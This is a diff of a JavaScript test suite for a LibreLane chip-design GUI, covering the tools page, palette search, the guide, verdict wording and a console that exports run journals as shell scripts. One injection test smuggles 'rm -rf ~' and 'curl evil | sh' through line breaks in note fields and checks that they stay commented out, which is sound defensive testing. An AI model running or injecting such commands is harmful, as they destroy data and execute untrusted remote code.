@@ -288,6 +288,9 @@ check("vcd.js: times read in real units, exact to the dump's resolution", () => 
   assert.equal(formatTime(5, parseTimescale("10ns")), "50 ns");
   assert.equal(formatTime(120020, ps, 20), "120.02 ns");            // ruler label, decimals from the step
   assert.equal(formatTime(0, ps), "0");
+  // No `timescale (Icarus writes 1s): plain time units, never "2680 s".
+  assert.equal(formatTime(2680, parseTimescale("1s")), "2680");
+  assert.equal(formatTime(200, parseTimescale("1s"), 200), "200");
 });
 
 check("vcd.js: aliases stay addressable; values come from the shared stream", () => {
@@ -638,7 +641,7 @@ check("compare: distinct tags across designs are design-prefixed for clarity", (
 check("compare + DSE never index the metric/config table by tag (N1 regression)", () => {
   // Both consumers of /api/compare must look up per-run values by the unique
   // col (run_dir); a `[…][r.tag]` lookup would re-introduce the collision.
-  for (const f of ["compare.js", "dse.js"]) {
+  for (const f of ["compare.js", "sweeps.js"]) {
     const src = readFileSync(resolve(MOD, f), "utf8");
     assert.doesNotMatch(src, /\]\[r\.tag\]/, `${f} indexes a per-run table by tag`);
     assert.doesNotMatch(src, /\]\[t\]/, `${f} indexes a per-run table by a bare tag var`);
@@ -753,7 +756,7 @@ check("decision surfaces never render a rounded metric without the raw escape", 
   // escape. Losing titleAttr here silently re-opens the precision hole (gap #2).
   // (Flow's report card carries the exact value in its own title: see the
   // "run report card" check.)
-  for (const f of ["compare.js", "dse.js"]) {
+  for (const f of ["compare.js", "sweeps.js"]) {
     const src = readFileSync(resolve(MOD, f), "utf8");
     assert.match(src, /fmt\.metric\(/, `${f}: precondition — it does round a metric`);
     assert.match(src, /titleAttr\(/, `${f}: rounds a metric but carries no raw escape`);
@@ -930,9 +933,17 @@ await checkAsync("tools: full fixture renders 10 tools, 7 PDK cards, 14 GF180 li
     }
     // gf180mcuD discloses 14 total libraries (12 published + 2 unavailable)
     assert.ok(pdkHtml.includes("Libraries (14)"), "gf180mcuD must disclose 14 total libraries");
-    assert.ok(pdkHtml.includes("gf180mcu_ocd_ip_sram"), "unavailable lib 1 missing");
-    assert.ok(pdkHtml.includes("gf180mcu_re_efuse"), "unavailable lib 2 missing");
-    assert.ok(pdkHtml.includes("(Not published for this release)"), "reason text missing");
+    // The picker itself opens in a dialog; its list comes from libraryListHtml.
+    const libHtml = toolsModule.libraryListHtml("gf180mcuD", fullFixture.pdk_catalog.gf180mcuD);
+    assert.ok(libHtml.includes("gf180mcu_ocd_ip_sram"), "unavailable lib 1 missing");
+    assert.ok(libHtml.includes("gf180mcu_re_efuse"), "unavailable lib 2 missing");
+    assert.ok(libHtml.includes("(Not published for this release)"), "reason text missing");
+    assert.equal((libHtml.match(/<label/g) || []).length, 14, "the picker lists all 14 libraries");
+    assert.equal((libHtml.match(/ checked/g) || []).length, 2, "only the starter set is pre-checked");
+    assert.equal((libHtml.match(/disabled/g) || []).length, 2, "unpublished libraries are disabled");
+    // Families: sky130, gf180mcu (default D first), ihp-sg13g2.
+    assert.deepEqual(toolsModule.pdkFamilies(fullFixture.pdk_catalog).map((f) => f.family + ":" + f.keys.join(",")),
+      ["sky130:sky130A,sky130B", "gf180mcu:gf180mcuD,gf180mcuA,gf180mcuB,gf180mcuC", "ihp-sg13g2:ihp-sg13g2"]);
 
     // 3. Render desktop viewers with container fallback
     await toolsModule.renderDesktopViewers(fullFixture);
@@ -953,6 +964,162 @@ await checkAsync("tools: full fixture renders 10 tools, 7 PDK cards, 14 GF180 li
     api.desktopTools = origDesktopTools;
     globalThis.document = oldDoc;
   }
+});
+
+check("tools: component rows say status, versions and keep Remove out of the main button", () => {
+  const html = toolsModule.rowHtml({
+    id: "tl-pdk-sky130A", name: "sky130A", status: "custom", have: "0000000d", want: "8afc8346",
+    action: "<button class='tl-act'>Update</button>", menu: ["<button class='tl-menu-item is-danger'>Remove sky130A</button>"],
+  });
+  assert.match(html, /class='tl-row is-problem' id='tl-pdk-sky130A' data-status='custom'/);
+  assert.match(html, /tl-chip is-custom'><span class='d'><\/span>Custom/);
+  assert.match(html, /tested 8afc8346/);
+  // Remove lives in the overflow menu, never beside the status.
+  const acts = html.slice(html.indexOf("tl-acts"));
+  assert.ok(acts.indexOf("Update") < acts.indexOf("tl-more"), "the main action comes first");
+  assert.ok(acts.indexOf("Remove") > acts.indexOf("tl-menu"), "Remove sits inside the menu");
+  assert.match(toolsModule.rowHtml({ id: "x", name: "n", status: "off" }), /data-status='off'/);
+  assert.ok(!/is-problem/.test(toolsModule.rowHtml({ id: "x", name: "n", status: "off" })), "an optional tool that isn't installed is not a problem");
+  assert.equal(toolsModule.shortVersion("Verilator 5.020 2024-01-01 rev (Debian 5.020-1)"), "5.020");
+  assert.equal(toolsModule.shortVersion("Docker version 29.8.1, build 4a63305"), "29.8.1");
+  assert.equal(toolsModule.shortVersion(""), "");
+});
+
+check("tools: Copy diagnostics carries versions, digest, PDKs, PDK_ROOT and host facts", () => {
+  const info = {
+    platform: "linux",
+    host: { kernel: "6.6.87.2-microsoft-standard-WSL2", os: "Ubuntu 24.04.4 LTS", python: "3.12.3", wsl: "yes" },
+    container: { engine: "docker", ready: true, version: "Docker version 29.8.1", image: "ghcr.io/librelane/librelane:3.0.4@sha256:eab0", image_present: true,
+      image_tested_digest: "sha256:eab0", image_custom: false, librelane_version: "3.0.4" },
+    pdk: { ciel_installed: true, installed_pdks: ["sky130A"], installed_sizes_mb: { sky130A: 7866 },
+      versions: { sky130A: { installed: "8afc", pinned: "8afc" } } },
+    tools: [{ key: "yosys", installed: false, in_container: true }, { key: "verilator", installed: true, version: "Verilator 5.020", path: "/usr/bin/verilator" }],
+  };
+  const t = toolsModule.diagnosticsText(info, { pdkRoot: "/home/lanex/.ciel", runMode: "container" });
+  for (const s of ["kernel 6.6.87.2-microsoft-standard-WSL2", "Ubuntu 24.04.4 LTS", "Docker version 29.8.1",
+    "librelane:3.0.4@sha256:eab0", "Tested image digest: sha256:eab0", "PDK_ROOT: /home/lanex/.ciel",
+    "PDK sky130A: 8afc | pinned 8afc", "Tool yosys: not installed | in image", "Tool verilator: Verilator 5.020 @ /usr/bin/verilator"]) {
+    assert.ok(t.includes(s), "diagnostics missing: " + s);
+  }
+  assert.ok(!t.includes("CUSTOM"), "the tested image is not flagged custom");
+  info.container.image_custom = true;
+  assert.ok(toolsModule.diagnosticsText(info).includes("CUSTOM image in use"));
+});
+
+check("tools: PDK family fallback knows IHP", () => {
+  assert.equal(toolsModule.pdkFamily({}, "ihp-sg13g2"), "ihp-sg13g2");
+  assert.equal(toolsModule.pdkFamily({}, "sg13g2"), "ihp-sg13g2");
+  assert.equal(toolsModule.pdkFamily({}, "gf180mcuD"), "gf180mcu");
+  assert.equal(toolsModule.pdkFamily({ x: { family: "fam" } }, "x"), "fam");
+});
+
+// ------------------------------------------------ tools: the verdict band's facts
+const toolsHealthy = () => ({
+  platform: "linux",
+  container: { available: true, ready: true, engine: "docker", version: "Docker version 29.8.1, build 4a63305", min_version: "25.0.5", version_ok: true,
+    image: "ghcr.io/librelane/librelane:3.0.4@sha256:eab07a50", image_present: true, image_approx_mb: 3000, image_custom: false,
+    image_tested_digest: "sha256:eab07a50", librelane_version: "3.0.4", docker: { present: true, usable: true }, podman: { present: false } },
+  pdk: { ciel_installed: true, installed_pdks: ["sky130A"], versions: { sky130A: { installed: "8afc", pinned: "8afc" } } },
+  pdk_catalog: { sky130A: { family: "sky130", default_variant: true }, gf180mcuD: { family: "gf180mcu", default_variant: true } },
+  tools: [
+    { key: "yosys", label: "Yosys", installed: false, in_container: true, install_recipe: ["apt", "yosys"] },
+    { key: "openroad", label: "OpenROAD", installed: false, in_container: true, container_only: true },
+    { key: "iverilog", label: "Icarus Verilog", installed: true },
+    { key: "graphviz", label: "Graphviz", installed: true },
+    { key: "gtkwave", label: "GTKWave", installed: true },
+  ],
+});
+
+check("tools: a healthy system has nothing to fix and reads 'Ready to run'", () => {
+  const items = toolsModule.attentionItems(toolsHealthy(), { desktop: { gds3d: { available: true } } });
+  assert.deepEqual(items, [], "a healthy container setup lists nothing");
+  const r = toolsModule.readiness(items);
+  assert.equal(r.tone, "pass");
+  assert.equal(r.title, "Ready to run");
+});
+
+check("tools: problems carry their fix; image and PDK drift are told apart", () => {
+  const info = toolsHealthy();
+  Object.assign(info.container, { ready: false, image_present: false, daemon_msg: "Cannot connect to the Docker daemon" });
+  info.container.docker.usable = false;
+  info.pdk.versions.sky130A.installed = "0000";
+  info.tools.find((t) => t.key === "graphviz").installed = false;
+  const items = toolsModule.attentionItems(info, { desktop: { gds3d: { available: false } } });
+  const by = Object.fromEntries(items.map((x) => [x.key, x]));
+  assert.equal(by.engine.tone, "fail");
+  assert.equal(by.engine.fix.id, "btn-start-docker", "a stopped Linux daemon is fixed by Start Docker daemon");
+  assert.equal(by.engine.title, "Docker is installed but not running");
+  assert.equal(by.image.tone, "fail");
+  assert.equal(by.image.fix, null, "the image can't download before the engine runs");
+  assert.equal(by["pdk-sky130A"].tone, "warn");
+  assert.deepEqual(by["pdk-sky130A"].fix, { label: "Update sky130A", id: "tl-pdk-sky130A", sel: ".pdk-install-btn" });
+  assert.equal(by["helper-graphviz"].tone, "info", "a missing helper is optional, not a problem");
+  assert.equal(by.gds3d.tone, "info");
+  const r = toolsModule.readiness(items);
+  assert.equal(r.tone, "fail");
+  assert.equal(r.title, "2 problems to fix");
+  // With the engine running, the image becomes the one fix, and it is a button.
+  Object.assign(info.container, { ready: true });
+  const img = toolsModule.attentionItems(info).find((x) => x.key === "image");
+  assert.equal(img.fix.id, "btn-pull-image");
+  assert.match(img.detail, /~2\.9 GB/);
+});
+
+check("tools: the Local tools engine judges native tools, not the image", () => {
+  const info = toolsHealthy();
+  Object.assign(info.container, { ready: false, available: false });
+  const items = toolsModule.attentionItems(info, { runMode: "local" });
+  const by = Object.fromEntries(items.map((x) => [x.key, x]));
+  assert.equal(by.engine.tone, "warn", "no engine is not a blocker with Local tools");
+  assert.equal(by["local-yosys"].tone, "fail");
+  assert.equal(by["local-yosys"].fix.sel, ".install-btn");
+  assert.equal(by["local-openroad"].fix, null, "OpenROAD has no system package to install");
+  assert.ok(!items.some((x) => x.key === "local-iverilog"), "helpers are not counted as the local toolchain");
+  // Container mode: the same missing native tools are not problems at all.
+  assert.ok(!toolsModule.attentionItems(toolsHealthy()).some((x) => x.key.startsWith("local-")));
+});
+
+check("tools: no PDK at all offers the default variant; ciel missing is a problem", () => {
+  const info = toolsHealthy();
+  info.pdk = { ciel_installed: false, installed_pdks: [], versions: {} };
+  const by = Object.fromEntries(toolsModule.attentionItems(info).map((x) => [x.key, x]));
+  assert.equal(by.ciel.fix.id, "install-ciel-btn");
+  assert.equal(by["pdk-none"].fix.label, "Install sky130A");
+  // A PDK already installing is not "no PDK".
+  const busy = toolsModule.attentionItems(info, { installJobs: { "pdk:sky130A": true } });
+  assert.ok(!busy.some((x) => x.key === "pdk-none"));
+  assert.equal(toolsModule.readiness(busy.filter((x) => x.key !== "ciel")).tone, "busy");
+});
+
+check("tools: engine fixes follow the platform", () => {
+  assert.deepEqual(toolsModule.engineFixes({ ready: true }), []);
+  assert.deepEqual(toolsModule.engineFixes({ available: true, platform: "darwin", docker: { present: true }, podman: { present: true } }).map((f) => f.id),
+    ["btn-start-docker", "btn-start-podman"]);
+  assert.deepEqual(toolsModule.engineFixes({ available: true, platform: "linux", docker: { present: true, group_fixable: true, usable: false }, podman: {} }).map((f) => f.id),
+    ["btn-enable-docker", "btn-start-docker", "btn-install-podman"]);
+  assert.deepEqual(toolsModule.engineFixes({ available: false }).map((f) => f.id), ["btn-install-docker", "btn-install-podman"]);
+});
+
+check("tools: a plain PDK Install downloads the starter libraries, never unpublished ones", () => {
+  const p = { libraries: ["a", "b", "c"], default_libraries: ["a", "x"], unavailable_libraries: { c: "Not published" } };
+  assert.deepEqual(toolsModule.libsForInstall(p), ["a"]);
+  assert.deepEqual(toolsModule.libsForInstall(p, new Set(["b", "c"])), ["b"], "the user's pick, minus unpublished");
+  assert.equal(toolsModule.libsForInstall({}), null, "no list: ciel picks its defaults");
+});
+
+check("tools: a card says what it is for and what uses it, actions only when needed", () => {
+  const html = toolsModule.cardHtml({ id: "tl-helper-gtkwave", name: "GTKWave", status: "ready", state: "Installed",
+    what: "Waveform viewer.", use: "RTL IDE › Open in GTKWave", ver: "3.3.116", menu: ["<button class='tl-menu-item is-danger'>Remove GTKWave</button>"] });
+  assert.match(html, /id='tl-helper-gtkwave' data-status='ready'/);
+  assert.match(html, /Used by<\/span> RTL IDE › Open in GTKWave/);
+  assert.ok(!/btn-primary/.test(html), "a healthy card has no primary button");
+  assert.ok(html.indexOf("Remove GTKWave") > html.indexOf("tl-menu"), "Remove sits in the More menu");
+});
+
+check("jumpnav: an unscrolled page never highlights its last section", () => {
+  const src = readFileSync(resolve(MOD, "jumpnav.js"), "utf8");
+  assert.match(src, /root\.scrollTop > 0 && root\.scrollTop \+ root\.clientHeight >= root\.scrollHeight - 2/,
+    "the at-the-bottom rule must require a real scroll (Tools/DSE lit 'Viewers' on load)");
 });
 
 // ------------------------------------------------ Analytics: the tool's numbers, shown honestly
@@ -1189,6 +1356,60 @@ check("layout: one Layout tab; Preview is gone everywhere", () => {
 // ---------- P0 glue: one context, links, stages, keys --------------------------------
 const FS = await import(toUrl(resolve(MOD, "flowstages.js")));
 
+check("tools: PDK family fallback knows sky130, gf180mcu and IHP", () => {
+  assert.equal(toolsModule.pdkFamily({}, "sky130A"), "sky130");
+  assert.equal(toolsModule.pdkFamily({}, "gf180mcuD"), "gf180mcu");
+  assert.equal(toolsModule.pdkFamily({}, "ihp-sg13g2"), "ihp-sg13g2");
+});
+
+check("steps: one count meaning (turned-off steps out of the total, current = done + 1)", () => {
+  const st = [...Array(76).fill("done"), "skipped", "skipped", "skipped", "skipped"];
+  assert.deepEqual(FS.stepCounts(st), { done: 76, total: 76, skipped: 4, current: 76 });
+  const live = ["done", "done", "skipped", "running", "pending"];
+  assert.deepEqual(FS.stepCounts(live), { done: 2, total: 4, skipped: 1, current: 3 });
+});
+
+{
+  const LI = await import(toUrl(resolve(MOD, "ide", "lintinfo.js")));
+  check("ide: plain hints for codeless syntax errors (missing ;, bad port)", () => {
+    assert.match(LI.explainMessage("syntax error, unexpected default, expecting ';'"), /semicolon .* line before/);
+    assert.match(LI.explainMessage("Pin not found: 'select'"), /port the module doesn't have/);
+    assert.equal(LI.explainMessage("something else entirely"), "");
+  });
+}
+{
+  const SU = await import(toUrl(resolve(MOD, "setup.js")));
+  check("run: the IDE's last syntax-check errors are read per project", () => {
+    const mem = { "ll.rtl:/p/a": JSON.stringify({ lint: { errors: 3, design_errors: 2, warnings: 1 } }), "ll.rtl:/p/b": JSON.stringify({ lint: { errors: 1, design_errors: 0 } }), "ll.rtl:/p/c": "{bad" };
+    const store = { get: (k, d) => (k in mem ? mem[k] : d) };
+    assert.equal(SU.lastLintErrors("/p/a", store), 2);
+    assert.equal(SU.lastLintErrors("/p/b", store), 0);
+    assert.equal(SU.lastLintErrors("/p/c", store), 0);
+    assert.equal(SU.lastLintErrors("/p/none", store), 0);
+    assert.equal(SU.lastLintErrors("", store), 0);
+  });
+}
+
+check("steps: list numbers skip turned-off steps (list N == header 'Step N' == NN- folder)", () => {
+  const live = ["done", "done", "skipped", "running", "pending"];
+  assert.deepEqual(FS.stepNumbers(live), [1, 2, null, 3, 4]);
+  // The running step's list number is the header's "Step N of M".
+  assert.equal(FS.stepNumbers(live)[3], FS.stepCounts(live).current);
+});
+
+// The run bar never guesses pass/fail for a verdict state it doesn't know.
+{
+  {
+    const RB = await import(toUrl(resolve(MOD, "runbar.js")));
+    check("run bar: verdict states map to words; unknown state is amber", () => {
+      assert.equal(RB.verdictWord({ verdict: { state: "warning", label: "x" } }).cls, "warn");
+      assert.equal(RB.verdictWord({ verdict: { state: "stopped" } }).cls, "warn");
+      assert.equal(RB.verdictWord({ verdict: { state: "brand-new", label: "Odd" } }).cls, "warn");
+      assert.equal(RB.verdictWord({ success: true }).cls, "pass");
+    });
+  }
+}
+
 check("stages: seven, in flow order, one name for each on every page", () => {
   assert.deepEqual(FS.STAGES.map((s) => s.label),
     ["Synthesis", "Floorplan", "Power grid", "Placement", "Clock tree", "Routing", "Sign-off"]);
@@ -1310,7 +1531,7 @@ check("run report card: one summary for the toast, the title and the notificatio
   assert.equal(clean.body, "setup +0.31 ns · 57 × 68.2 µm · 1 min 1 s", "the numbers, not just 'done'");
   const halted = RC.runSummary({ tag: "t", rx: { kind: "halted", step: { id: "OpenROAD.GlobalPlacement" },
     card: { title: "Placement ran out of room", plain: "The cells need 207 % of the core area, so they can't all be placed. The die is fixed." } }, rs });
-  assert.match(halted.title, /stopped at OpenROAD\.GlobalPlacement/);
+  assert.match(halted.title, /failed at OpenROAD\.GlobalPlacement/);
   assert.match(halted.body, /^Placement ran out of room\. The cells need 207 %/);
   assert.equal(RC.runSummary({ tag: "t", rx: { kind: "stopped" }, rs }).tone, "warn");
   // Every number on the card keeps its exact value one hover away.
@@ -1336,7 +1557,7 @@ check("one verdict: Verify and Flow say 'Clean', never 'tape-out ready'", () => 
   const vw = VM.verdictCopy(warned);
   assert.equal(vw.tone, "warn");
   assert.equal(vw.title, "Clean, with 1 warning");
-  assert.match(vw.sub, /Setup violations warns instead of failing it \(TIMING_VIOLATION_CORNERS = \*tt\*\)/);
+  assert.match(vw.sub, /LibreLane only warned about Setup violations instead of failing the run \(TIMING_VIOLATION_CORNERS = \*tt\*\)/);
   const sw = RC.runSummary({ tag: "t", rx: { kind: "clean" }, vf: warned, rs: { steps: [] } });
   assert.equal(sw.title, "t is clean, with 1 warning");
   assert.equal(sw.tone, "warn");
@@ -1375,6 +1596,16 @@ check("fix loop: every setting fix says where the new run resumes and opens the 
   assert.match(open, /data-go-section='an-timing'/);
   assert.equal(PX.countText({ counts: { fail: 2, warn: 1 } }), "3 problems");
   assert.equal(PX.countText({ counts: { fail: 0, warn: 0 } }), "");
+});
+
+check("status bar badge: counts and colour follow the shared run verdict", () => {
+  const many = { counts: { fail: 3, warn: 2 } };
+  assert.deepEqual(PX.badgeOf({ state: "failed", label: "2 checks failed", blockers: 2, warnings: 1 }, many), { tone: "fail", text: "2 checks failed" });
+  assert.deepEqual(PX.badgeOf({ state: "passed", label: "Clean, 1 warning", blockers: 0, warnings: 1 }, many), { tone: "warn", text: "1 warning" });
+  assert.equal(PX.badgeOf({ state: "passed", label: "Clean", blockers: 0, warnings: 0 }, many), null, "a clean run shows no badge");
+  assert.deepEqual(PX.badgeOf({ state: "warning", label: "Finished: timing misses", timing_miss: { kind: "setup" }, warnings: 1 }, many), { tone: "warn", text: "Timing misses" });
+  assert.equal(PX.badgeOf({ state: "stopped", label: "Stopped" }, many), null);
+  assert.deepEqual(PX.badgeOf(null, { counts: { fail: 0, warn: 2 } }), { tone: "warn", text: "2 warnings" });
 });
 
 check("fix loop: the worst path is described from what its numbers say", () => {
@@ -1434,6 +1665,47 @@ check("setup: the picker follows and saves the config's PDK; a mismatch offers b
   assert.match(pf, /data-act='pdk-save'/);
 });
 
+// ------------------------------------------------ first-run guide
+const GS = await import(toUrl(resolve(MOD, "guide-steps.js")));
+check("guide: beats move on only on their own event, and only when it went well", () => {
+  assert.equal(GS.BEATS.length, 6);
+  assert.ok(GS.BEATS[0].done && !GS.BEATS[0].on, "the first beat (installed) is done already");
+  assert.equal(GS.advance(1, "g:project_opened", { dir: "/x" }), 2);
+  assert.equal(GS.advance(1, "g:sim_done", { verdict: "passed" }), 1, "an event for a later beat is ignored");
+  assert.equal(GS.advance(2, "g:sim_done", { verdict: "passed" }), 3);
+  assert.equal(GS.advance(2, "g:sim_done", { verdict: "ran" }), 3);
+  assert.equal(GS.advance(2, "g:sim_done", { verdict: "build" }), 2, "a sim that didn't build stays");
+  assert.equal(GS.advance(3, "g:pdk_confirmed", {}), 4);
+  assert.equal(GS.advance(4, "g:run_started", { tag: "t" }), 5);
+  assert.equal(GS.advance(5, "g:flow_done", { error: "boom" }), 5, "a failed run stays");
+  assert.equal(GS.advance(5, "g:flow_done", { cancelled: true }), 5, "a stopped run stays");
+  assert.equal(GS.advance(5, "g:flow_done", {}), 6);
+  assert.equal(GS.pillText(2), "FIRST CHIP 3/6");
+  assert.equal(GS.pillText(9), "FIRST CHIP 6/6");
+  assert.equal(GS.counter(1, 5), "02/05");
+  assert.equal(GS.TOUR.length, 5, "the tour has five stops");
+});
+check("guide: saved state is read defensively", () => {
+  assert.deepEqual(GS.normState(null), { active: false, beat: 1 });
+  assert.deepEqual(GS.normState("{bad json"), { active: false, beat: 1 });
+  assert.deepEqual(GS.normState('{"active":true,"beat":3,"project":"/p"}'), { active: true, beat: 3, project: "/p" });
+  assert.equal(GS.normState({ active: true, beat: 99 }).beat, 6);
+  assert.equal(GS.normState({ active: true, beat: -2 }).beat, 1);
+});
+check("guide: the finish card shows only numbers the run has", () => {
+  const rows = [
+    { label: "Die area", value: 2500, unit: "µm²", key: "design__die__area" },
+    { label: "Die size", value: "50.0 × 50.0", unit: "µm", key: "design__die__bbox" },
+    { label: "Cell count", value: 312, unit: "", key: "design__instance__count" },
+  ];
+  const f = GS.chipFacts(rows, 10);
+  assert.deepEqual(f.map((x) => x.label), ["Die size", "Clock", "Cells placed"]);
+  assert.equal(f[1].value, "10");
+  assert.match(f[1].unit, /100 MHz/);
+  assert.deepEqual(GS.chipFacts([], null), [], "no numbers, no facts");
+  assert.deepEqual(GS.chipFacts([rows[0]], "x").map((x) => x.label), ["Die area"]);
+});
+
 // ------------------------------------------------ provenance everywhere
 check("provenance: a report line by needle, first or last (Netgen's verdict)", () => {
   const t = "Number of devices: 3\nFinal result: no\nsub\nFinal result: Circuits match uniquely.\n";
@@ -1462,6 +1734,326 @@ check("provenance: every value on Verify, Analytics and Setup has its source but
   for (const k of ["DESIGN_NAME", "CLOCK_PORT", "CLOCK_PERIOD", "PDK", "STD_CELL_LIBRARY"]) {
     assert.match(html, new RegExp("data-src-key=\"" + k + "\""), k + " has a source slot on Setup");
   }
+});
+
+// ------------------------------------------------- palette search (spec 5.8)
+const PM = await import(toUrl(resolve(MOD, "palettemodel.js")));
+
+check("palette: prefixes pick a group, no prefix searches everything", () => {
+  assert.deepEqual(PM.parseQuery("#clock"), { group: "setting", q: "clock", prefix: "#" });
+  assert.deepEqual(PM.parseQuery("@ dse"), { group: "run", q: "dse", prefix: "@" });
+  assert.equal(PM.parseQuery("/spm.v").group, "file");
+  assert.equal(PM.parseQuery("?drc").group, "help");
+  assert.equal(PM.parseQuery(">run").group, "action");
+  assert.deepEqual(PM.parseQuery("  drc "), { group: null, q: "drc", prefix: "" });
+});
+
+check("palette: exact > prefix > word start > substring > subsequence", () => {
+  const s = (t) => PM.fuzzyScore("clock", t);
+  assert.ok(s("clock") > s("CLOCK_PERIOD"));
+  assert.ok(s("CLOCK_PERIOD") > s("PL_CLOCK_X"));          // prefix beats word start
+  assert.ok(s("PL_CLOCK_X") > s("unclocked"));              // word start beats mid-word
+  assert.ok(s("unclocked") > s("c_l_o_c_k"));               // substring beats subsequence
+  assert.equal(PM.fuzzyScore("zzz", "CLOCK_PERIOD"), -1);
+});
+
+check("palette: ranking, group filter, recents first", () => {
+  const items = [
+    { id: "a:run", group: "action", title: "Run the flow" },
+    { id: "a:verify", group: "action", title: "Go to Verify" },
+    { id: "s:CLOCK_PERIOD", group: "setting", title: "CLOCK_PERIOD", keys: ["The clock period in ns."] },
+    { id: "s:FP_CORE_UTIL", group: "setting", title: "FP_CORE_UTIL", keys: ["Core utilization percentage."] },
+    { id: "s:MAGIC_DRC_USE_GDS", group: "setting", title: "MAGIC_DRC_USE_GDS", keys: ["Run DRC on the GDS."] },
+    { id: "h:DRC", group: "help", title: "DRC", keys: ["Design Rule Check."] },
+    { id: "f:src/spm.v", group: "file", title: "src/spm.v" },
+    { id: "r:d:dse-spm-02", group: "run", title: "dse-spm-02" },
+  ];
+  assert.equal(PM.rank(items, "#clock")[0].id, "s:CLOCK_PERIOD");
+  assert.ok(PM.rank(items, "#clock").every((i) => i.group === "setting"));
+  assert.equal(PM.rank(items, "FP_CORE")[0].id, "s:FP_CORE_UTIL");
+  assert.equal(PM.rank(items, "drc")[0].id, "h:DRC", "an exact title match wins");
+  assert.equal(PM.rank(items, "spm.v")[0].id, "f:src/spm.v");
+  assert.equal(PM.rank(items, "@spm")[0].id, "r:d:dse-spm-02");
+  assert.ok(PM.rank(items, "utilization").some((i) => i.id === "s:FP_CORE_UTIL"), "descriptions are searched");
+  // Empty: actions only, recents on top (a recent setting shows too).
+  const empty = PM.rank(items, "", { recentIds: ["s:FP_CORE_UTIL", "a:verify"] });
+  assert.deepEqual(empty.map((i) => i.id), ["s:FP_CORE_UTIL", "a:verify", "a:run"]);
+  // A recent pick wins a tie.
+  const tie = [{ id: "x1", group: "action", title: "Open A" }, { id: "x2", group: "action", title: "Open B" }];
+  assert.equal(PM.rank(tie, "open", { recentIds: ["x2"] })[0].id, "x2");
+  assert.deepEqual(PM.pushRecent(["a", "b", "c"], "b", 3), ["b", "a", "c"]);
+  assert.equal(PM.oneLine("First sentence here is long enough. Second one.", 200), "First sentence here is long enough.");
+});
+
+check("palette: several words match in any order; run times are local", () => {
+  const items = [
+    { id: "g", group: "action", title: "First-chip guide", keys: ["Help"] },
+    { id: "t", group: "action", title: "Take the tour" },
+    { id: "c", group: "setting", title: "CLOCK_PERIOD", keys: ["The clock period in ns."] },
+  ];
+  assert.deepEqual(PM.rank(items, "first chip").map((i) => i.id), ["g"]);
+  assert.deepEqual(PM.rank(items, "chip first").map((i) => i.id), ["g"]);
+  assert.deepEqual(PM.rank(items, "clock ns").map((i) => i.id), ["c"], "a word may match the description");
+  assert.deepEqual(PM.rank(items, "tour zzz"), [], "every word must match");
+  const now = new Date(2026, 9, 28, 18, 0);
+  const at = new Date(2026, 9, 28, 17, 22);
+  assert.match(PM.whenLocal(at.toISOString(), now), /^today /);
+  assert.ok(!PM.whenLocal(at.toISOString(), now).includes("T"), "not the raw ISO text");
+  assert.equal(PM.whenLocal("", now), "");
+});
+
+// ------------------------------------------------- console drawer (spec 5.9)
+const CNM = await import(toUrl(resolve(MOD, "consolemodel.js")));
+const HK = await import(toUrl(resolve(MOD, "hotkeys.js")));
+
+check("console: shell quoting matches shlex.quote", () => {
+  assert.equal(CNM.shq("config.yaml"), "config.yaml");
+  assert.equal(CNM.shq("VERILOG_FILES=a.v b.v"), "'VERILOG_FILES=a.v b.v'");
+  assert.equal(CNM.shq("it's"), "'it'\"'\"'s'");
+  assert.equal(CNM.shq(""), "''");
+});
+
+check("console: next-run script pins the image only for a container run", () => {
+  const c = { container: "librelane --docker-no-tty --dockerized config.yaml -p sky130A", local: "librelane /d/config.yaml", recommended: "container", cwd: "/home/u/my design" };
+  assert.equal(CNM.pickCommand(c), c.container);
+  assert.equal(CNM.pickCommand({ ...c, recommended: "local" }), c.local);
+  const s = CNM.commandScript({ command: c.container, cwd: c.cwd, image: "ghcr.io/librelane/librelane:3.0.4@sha256:ab" });
+  assert.match(s, /^#!\/usr\/bin\/env bash\n/);
+  assert.match(s, /\ncd '\/home\/u\/my design'\n/);
+  assert.match(s, /\nexport LIBRELANE_IMAGE_OVERRIDE=ghcr.io\/librelane\/librelane:3.0.4@sha256:ab\n/);
+  assert.ok(s.trimEnd().endsWith(c.container));
+  assert.ok(!/IMAGE_OVERRIDE/.test(CNM.commandScript({ command: c.local, cwd: "/d", image: "x" })));
+});
+
+check("console: the Journal as a script runs only commands, the rest are comments", () => {
+  const s = CNM.journalScript([
+    { time: "10:00:00", title: "Config edited", notes: ["FP_CORE_UTIL 50 -> 60"] },
+    { time: "10:01:00", title: "Run a1 · finished", command: "librelane --dockerized config.yaml --run-tag a1", cwd: "/d", image: "img@sha256:1" },
+    { time: "10:05:00", title: "Run a2 · finished", command: "librelane --dockerized config.yaml --run-tag a2", cwd: "/d", image: "img@sha256:1" },
+  ]);
+  const live = s.split("\n").filter((l) => l && !l.startsWith("#"));
+  assert.deepEqual(live, ["set -euo pipefail", "cd /d", "export LIBRELANE_IMAGE_OVERRIDE=img@sha256:1",
+    "librelane --dockerized config.yaml --run-tag a1-repro", "librelane --dockerized config.yaml --run-tag a2-repro"]);
+  // A replay must not write into the runs it replays (LibreLane appends to an existing tag).
+  assert.equal(CNM.retag("librelane c --run-tag a1 -i runs/a1/s.json"), "librelane c --run-tag a1-repro -i runs/a1/s.json");
+  assert.match(s, /#   FP_CORE_UTIL 50 -> 60/);
+  assert.deepEqual(CNM.configDiffLines({ set: { FP_CORE_UTIL: 60 }, remove: ["X"] }, { before: { FP_CORE_UTIL: 50 } }),
+    ["FP_CORE_UTIL 50 -> 60", "X removed (back to its default)"]);
+});
+
+check("console: a line break in a note or run name never becomes a command in the script", () => {
+  const s = CNM.journalScript([
+    { time: "10:00:00", title: "Run a\nrm -rf ~ started", notes: ["CLOCK_PERIOD=10\r\ncurl evil | sh", "x" + String.fromCharCode(0x2028) + "id"] },
+  ], { title: "t\nid" });
+  const live = s.split(/\r?\n/).filter((l) => l && !l.startsWith("#"));
+  assert.deepEqual(live, ["set -euo pipefail"]);
+  assert.equal(CNM.commandScript({ command: "librelane x", title: "a\nid" }).split("\n").filter((l) => l === "id").length, 0);
+});
+
+check("console: command history steps like a shell and keeps the draft", () => {
+  const h = new CNM.History(["a", "b"]);
+  assert.equal(h.up("typing"), "b");
+  assert.equal(h.up("b"), "a");
+  assert.equal(h.up("a"), "a");
+  assert.equal(h.down("a"), "b");
+  assert.equal(h.down("b"), "typing");
+  h.push("c"); h.push("c");
+  assert.deepEqual(h.items, ["a", "b", "c"]);
+  assert.equal(CNM.runTagOf("librelane --dockerized config.yaml --run-tag 'x1' -T floorplan"), "x1");
